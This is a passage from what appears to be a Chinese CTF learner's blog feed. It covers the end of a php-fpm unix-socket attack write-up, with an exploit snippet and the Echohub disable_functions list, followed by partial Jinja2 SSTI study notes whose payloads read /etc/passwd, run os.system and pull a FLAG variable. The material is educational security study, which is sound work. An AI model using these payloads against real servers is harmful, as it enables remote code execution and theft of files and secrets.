&lt;p>正常来说，只有open_basedir被解放后才可以scandir(&amp;rsquo;/&amp;rsquo;)（没有的话是只可以scandir(&amp;rsquo;/var/www/html&amp;rsquo;)），而既然这样可以执行成功就说明开始的fpm流量一定被正常打出去了，再加上.so也被写入（我到docker上看了），那么.so一定会在php执行时被触发，一定是可以执行.so中我们写的命令的；但是现在竟然连scandir(&amp;rsquo;/&amp;rsquo;)都只能执行一次 ？？？？？？？后面就都失败了，更不要说.so中的命令了，肯定更是没有执行&lt;/p>
&lt;p>之后又尝试了很多次，.so正常上传，最开始打向fpm的流量也又打了几遍，失败；再之后.so也不能正常上传了，最初的那个流量也打不成了，只能回显int(xxx)，但是没有eval()的回显，说明还是不正常，然后他妈的，间或有一两次能成功，甚至我都又在/tmp目录下写了别的文件（如果前面的流量没正常打出去的话是绝对不可能做到的，肯定是bool(false)），但是但是但是又是一秒破功，真是不理解了，完全是跟前面一模一样的payload，但是就他妈玄学，吐了&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211115014616324.png" alt="image-20211115014616324">&lt;/p>
&lt;p>不想再耗太多时间在这个题上了，实在是绷不住了（调了快1天了），基本也算是打通了（毕竟就差一点点啊啊啊啊啊 我截图还有呢）（其实是懒的重置docker再尝试了 我的），我猜测出错的点在于那个开在46819端口的ftp服务器不稳定，它在处理这边ftp打出的流量时可能没有正常的处理，再加上来回调整payload打了太多次了，可能之前的错误累积到后面，比如某次没有urlencode之类的，搞得环境也不正常了&lt;/p>
&lt;h4 id="蓝帽杯-2021one-pointer-php">***[蓝帽杯 2021]One Pointer PHP&lt;/h4>
&lt;hr>
&lt;p>yysy，确实没时间复现（复现赵总的题让我有心理阴影了）&lt;/p>
&lt;p>我就先云一下，对8起&lt;/p>
&lt;p>参考：&lt;a href="http://www.yang99.top/index.php/archives/52/">wp1&lt;/a> | &lt;a href="https://ha1c9on.top/2021/04/29/lmb_one_pointer_php/">wp2&lt;/a>&lt;/p>
&lt;h3 id="攻击unix-socket模式下的php-fpm">攻击unix socket模式下的php-fpm&lt;/h3>
&lt;p>由于unix socket是读取/run/php/php7.4-fpm.sock进行内部通信，那必然是不能打远程，用的是&lt;code>stream_socket_client&lt;/code>建立一个unix socket连接，然后写入tcp流来通信&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span> &lt;span style="color:#111">$sock&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">stream_socket_client&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;unix:///run/php/php7.3-fpm.sock&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#75af00">fputs&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$sock&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">base64_decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;A&amp;#39;&lt;/span>&lt;span style="color:#111">]));&lt;/span>&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">fread&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$sock&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">4096&lt;/span>&lt;span style="color:#111">));&lt;/span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="ctf-2019echohub">[*CTF 2019]Echohub&lt;/h4>
&lt;p>前面的pwn部分我是不太能看懂（至少目前），就简单说说后面的web部分；&lt;a href="https://mochazz.github.io/2019/05/03/2019%E6%98%9FCTF%E4%B9%8BWeb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/#Echohub">这里是参考wp&lt;/a>&lt;/p>
&lt;p>从phpinfo可以看到disable_functions&lt;/p>
&lt;pre tabindex="0">&lt;code>file_get_contents,file_put_contents,fwrite,file,chmod,chown,copy,link,fflush,mkdir,popen,rename,touch,unlink,pcntl_alarm,move_upload_file,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,fsockopen,pfsockopen,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,curl_init,curl_exec,curl_multi_init,curl_multi_exec,dba_open,dba_popen,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,dl,putenv
&lt;/code>&lt;/pre>&lt;p>考虑用&lt;code>create_function&lt;/code>来rce，不过还是绕不过disable_functions来执行/readflag&lt;/p>
&lt;p>不过跑一下给出的docker，可以看到用unix socket模式运行的php-fpm&lt;/p>
&lt;p>题目环境安装了apache服务器和apache-module模式的php模块（这个就是题目环境），但是fpm也安装了并且启动&lt;/p>
&lt;p>fpm模式的php.ini与phpinfo中显示的不同，是独立的，disable_funtcions的限制宽松很多，我们来打它来rce，exp就是上面那个&lt;/p>
&lt;hr>
&lt;p>拖拖拉拉四五天，总算是抽空给总结完了，对做题和学习方面又有了一些船新的理解，还是有很多收获的&lt;/p>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
以下是本文中涉及到的 和我学习时看过的所有文章的链接 每日感谢互联网的丰富资源（
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="https://blog.csdn.net/shreck66/article/details/50355729">fastcgi协议分析与实例&lt;/a> | &lt;a href="https://www.kancloud.cn/digest/php-src/136260">php-fpm 与 Nginx优化总结&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://evoa.me/archives/6/">PHP 连接方式 &amp;amp; PHP-FPM未授权访问漏洞 &amp;amp; *CTF echohub&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://xz.aliyun.com/t/5598">浅析php-fpm的攻击方式&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">Fastcgi协议分析 &amp;amp;&amp;amp; PHP-FPM未授权访问漏洞 &amp;amp;&amp;amp; Exp编写&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://mp.weixin.qq.com/s/LP_vfBx3M512P0rYdMMWOA">【技术分享】深入 FTP 攻击 php-fpm 绕过 disable_functions&lt;/a>&lt;/p>
&lt;/details>
&lt;hr>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
一点对近况的碎碎念
&lt;/h4>
&lt;/summary>
&lt;p>最近有点自闭，看着那么多和我学习时间差不多的师傅都已经相当相当厉害了，我还是跟刚开始一样菜，满打满算学了也半年多了，怎么就这么菜呢？？？？？？？差距太大了，他妈的就是菜啊&lt;/p>
&lt;p>看看别人博客都写得啥，cve复现，漏洞挖掘，渗透实战，安全研究，我呢？全是互联网湿垃圾，没一点含金量，就会写一点wp，还大多都是参考了别人的内容，然后写一点知识总结，跟个小学生一样&lt;/p>
&lt;p>这周下了决心把没用的课的假请掉了，希望自己能好好利用起来，别摆了，真别摆了，要出大问题&lt;/p>
&lt;p>不过总结是很有必要的，现在的进度是这样：&lt;/p>
&lt;ul>
&lt;li>php反序列化：缺 原生类的学习+跟一些实际的链子&lt;/li>
&lt;li>python反序列化：完&lt;/li>
&lt;li>sqli：差不多完，还得多做点题加深理解&lt;/li>
&lt;li>SSTI：完&lt;/li>
&lt;li>文件上传：之前9月总结到一半去打hvv了&lt;/li>
&lt;li>php-fpm：完&lt;/li>
&lt;li>GraphQL：完&lt;/li>
&lt;/ul>
&lt;p>很薄弱的地方都还没掌握（这不是废话），几个急需总结掌握的：&lt;/p>
&lt;ul>
&lt;li>ssrf：不熟练&lt;/li>
&lt;li>xss：做题遇到都是躲着走&lt;/li>
&lt;li>js圆形污染：跟上面那个总是一起出现&lt;/li>
&lt;li>xxe&lt;/li>
&lt;li>xsleaks&lt;/li>
&lt;/ul>
&lt;p>还有java，这个必须得学&lt;/p>
&lt;p>不多说了，冲！！！&lt;/p>
&lt;/details></description></item><item><title>SSTI学习笔记</title><link>https://amiaaaz.github.io/2021/11/08/ssti-study-notes/</link><pubDate>Mon, 08 Nov 2021 20:59:28 +0800</pubDate><guid>https://amiaaaz.github.io/2021/11/08/ssti-study-notes/</guid><description>&lt;p>模板渲染可以借助代码构造（如条件、循环语句等）十分方便的动态呈现内容，但如果编写不当容易被攻击者注入恶意内容从而暴露上下文数据，甚至在服务器上运行执行任意命令的表达式&lt;/p>
&lt;h1 id="jinja">Jinja&lt;/h1>
&lt;p>Jinja2是一种面向Python的现代和设计友好的模板语言，以Django的模板为模型，是Flask框架的一部分&lt;/p>
&lt;p>Jinja2 能识别所有类型的变量，甚至是一些复杂的类型，例如列表、字典和对象。此外，还可使用&lt;u>过滤器&lt;/u>修改变量，过滤器名添加在变量名之后，中间使用竖线分隔（这很有利于我们构造恶意的payload），比如这样的模板可以用首字母大写形式显示变量name的值&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>Hello, {{name|capitalize}}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Jinjia2也支持控制语句，比如这是一个常见的&lt;u>for语句&lt;/u>的渲染情况&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">ul&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {% for comment in comments %}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">li&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>{{comment}}&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">li&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {% endfor %}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">ul&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>之所以有模板渲染的漏洞是因为在渲染传递进去的参数时模板可以直接访问Python的一些对象及方法，可以构造一个长长的继承链来执行一些操作，比如文件读写&amp;amp;命令执行&lt;/p>
&lt;ul>
&lt;li>&lt;code>__dict__&lt;/code>：保存类实例或对象实例的属性变量键值对字典&lt;/li>
&lt;li>&lt;code>__class__&lt;/code>：返回一个实例所属的类；python中的新式类（显示继承object对象的类）都有一个属性&lt;code>__class&lt;/code>用于获取当前实例对应的类&lt;/li>
&lt;li>&lt;code>__mro__&lt;/code>：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析（即MRO - Method Resolution Order）&lt;/li>
&lt;li>&lt;code>__bases__&lt;/code>：以元组形式返回一个类直接所继承的类（可以理解为直接父类）&lt;/li>
&lt;li>&lt;code>__base__&lt;/code>：返回一个类直接所继承的类（单个）（相当于&lt;code>__bases__[0]&lt;/code>），和&lt;code>__mro__&lt;/code>都是用来寻找基类的&lt;/li>
&lt;li>&lt;code>__subclasses__&lt;/code>：以列表形式返回类的所有存活子类的引用（而非实例）；python中的类都继承自object，只要调用object类对象的&lt;code>__subclasses__()&lt;/code>方法就可以获取想要的子类&lt;/li>
&lt;li>&lt;code>__init__&lt;/code>：类的初始化方法&lt;/li>
&lt;li>&lt;code>__globals__&lt;/code>：对包含函数全局变量的字典的引用，可以进一步获取file, os等模块&lt;/li>
&lt;li>&lt;code>__builtin__&lt;/code>&amp;amp;&amp;amp;&lt;code>__builtins__&lt;/code>：返回不用导入模块可以直接运行一些函数，例如int()，list()等内建函数，查看的方法是&lt;code>dir(__builtins__)&lt;/code>　　
&lt;ul>
&lt;li>在py2中&lt;code>__builtins__&lt;/code>模块是解释器自动创建的对于&lt;code>__builtin__&lt;/code>模块的引用，并非&lt;code>__buitin__&lt;/code>本身（在主模块中时，情况类似我们创建一个变量并对它做一次引用传递，两者是一样的，指向相同；当不是主模块 而是我们创建的一个可以被导入的模块时，&lt;code>__builtins__&lt;/code>其实是对&lt;code>__builtin__.__dict__&lt;/code>模块的引用）&lt;/li>
&lt;li>在py3中&lt;code>__builtin__&lt;/code>被命名为&lt;code>builtins&lt;/code>&lt;/li>
&lt;li>参考：&lt;a href="https://blog.51cto.com/xpleaf/1764849">深入理解Python中的&lt;code>__builtin__&lt;/code>和&lt;code>__builtins__&lt;/code>&lt;/a> | &lt;a href="https://zhuanlan.zhihu.com/p/125693125">&lt;code>__builtins__&lt;/code> 与 &lt;code>__builtin__&lt;/code>（builtins）&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="构造的原理">构造的原理&lt;/h2>
&lt;p>一言以蔽之：通过一个长长的调用继承链来将内建的函数或模块揪出来用&lt;/p>
&lt;h3 id="step1---找到基类object">step1 - 找到基类object&lt;/h3>
&lt;p>通过字符串、字典、列表、元组和很特殊的request来获取基类object，mro和bases[0]均可（或者是base 一样的效果，不一一列举）&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211108104543559.png" alt="image-20211108104543559">&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__mro__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#75715e"># py2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__mro__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#75715e"># py3&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">{}&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__bases__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__bases__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__bases__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__mro__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="step2---获得能用的子类">step2 - 获得“能用的”子类&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>会以列表形式返回object基类下的所有子类，我们需要的是其中含有&lt;code>os&lt;/code>, &lt;code>file&lt;/code>, &lt;code>__builtins__&lt;/code>模块的子类；这里给出一个脚本，可以单独寻找特定子类，也可以根据想要的模块找到对应的子类，返回索引位置&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># py2 &amp;amp; py3&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">subclass&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;warnings.WarningMessage&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">module&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">raw&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">enumerate&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">raw&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">subclass&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">value&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;[*] &lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200"> - &lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">value&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">module&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">keys&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">except&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">pass&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211108115828170.png" alt="image-20211108115828170">到这一步可以得到的&lt;/p>
&lt;p>到这一步，我们的payload已经构造好一半了（以下index均指我们需要的subclass的索引位置）&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="step3---调用相关函数进行rce">step3 - 调用相关函数进行rce&lt;/h3>
&lt;h4 id="py2---fileoslinecache">py2 - file&amp;amp;os&amp;amp;linecache&lt;/h4>
&lt;p>&lt;code>&amp;lt;type 'file'&amp;gt;&lt;/code>是py2的专属，直接可以用&lt;code>read()&lt;/code>, &lt;code>write()&lt;/code>, &lt;code>readlines()&lt;/code>进行文件读写&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#ae81ff">40&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#39;/etc/passwd&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#ae81ff">40&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#39;/tmp&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;test&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>os&lt;/code>模块就不必说了，有&lt;code>system()&lt;/code>可以直接rce的函数；在py2中这两个子类可以直接用&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># &amp;lt;class &amp;#39;site._Printer&amp;#39;&amp;gt;, 71&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># &amp;lt;class &amp;#39;site.Quitter&amp;#39;&amp;gt;, 76&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;os&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">{{()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;os&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__dict__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">environ&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;FLAG]}}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>不嫌麻烦的还可以再套一层，用&lt;code>linecache&lt;/code>来调用&lt;code>os&lt;/code>，py2中有这两个类含有&lt;code>linecache&lt;/code>模块&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># &amp;lt;class &amp;#39;warnings.WarningMessage&amp;#39;&amp;gt;, 58&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># &amp;lt;class &amp;#39;warnings.catch_warnings&amp;#39;, 59&lt;/span>
